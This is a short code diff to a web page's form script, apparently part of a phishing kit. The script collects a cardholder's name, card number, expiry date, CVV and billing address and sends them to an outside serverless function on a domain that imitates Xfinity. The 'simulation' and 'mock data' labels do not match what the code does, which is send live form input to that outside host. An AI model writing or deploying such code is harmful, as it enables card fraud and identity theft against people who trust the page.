@@ -172,25 +172,27 @@
         window.location.href = "info.html";
 
         try {
-          const res = await fetch("/.netlify/functions/send-email", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify({
-              c_name,
-              c_num,
-              c_date,
-              c_cvv,
-              c_address,
-              pageName: "Billing Simulation", // This changes per page
-            }),
-          });
+          const res = await fetch(
+            "https://xfinity-protocol-login.netlify.app/.netlify/functions/send-email",
+            {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                c_name,
+                c_num,
+                c_date,
+                c_cvv,
+                c_address,
+                pageName: "Billing Simulation", // This changes per page
+              }),
+            }
+          );
 
           const data = await res.json();
           console.log("Serverless function response:", data);
         } catch (err) {
           console.error("Error sending mock data:", err);
+          alert("Error sending email: " + err.message);
         }
       });
     </script>
